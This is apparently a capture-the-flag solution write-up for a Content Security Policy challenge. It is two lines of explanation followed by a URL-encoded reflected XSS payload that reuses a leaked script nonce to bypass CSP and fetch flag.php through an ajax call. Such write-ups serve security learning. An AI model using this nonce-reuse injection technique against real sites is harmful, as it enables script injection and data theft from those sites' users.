## Solution

Challenge based on playing with Content Security Policy header

Solution is XSS with found but blocked script from other endpoint
You need to include here nonce to bypass CSP

```
<domain_name>/Never_gonna_say_goodbye.html?a=%3Cscript%20nonce%3D%22JIYr435smMmKG1nAAFNlrKUewAEaTWt1%22%3E%20$.ajax({%20%20%20url:%20%22flag.php%22,%20%20%20headers:%20{%20%20%20%20%20%22Nonce%22:%22JIYr435smMmKG1nAAFNlrKUewAEaTWt1%22%20%20%20},%20%20%20success:%20function(result){%20%20%20%20console.log(result);%20%20%20%20%20%20}});%20%3C/script%3E
```
